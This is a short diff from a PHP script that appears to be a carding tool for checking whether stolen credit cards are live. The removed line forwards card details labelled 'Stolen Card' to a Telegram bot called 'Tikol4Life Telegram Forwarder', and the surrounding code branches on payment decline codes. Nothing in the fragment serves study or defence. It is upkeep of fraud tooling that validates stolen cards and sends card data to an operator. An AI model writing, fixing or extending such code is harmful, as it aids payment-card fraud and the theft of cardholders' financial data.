@@ -541,8 +541,7 @@
 						//CCN LIVE: Stolen Card
 						if(isset($telebot) && $telebot != ""){
 							if($tele_msg == "2"|| $tele_msg == "3") {
-								BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
-							}
+															}
 						}
 						// EchoMessage('CCN LIVE',$cc_info.' >> '.$err); // Removed undefined function call
 					}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
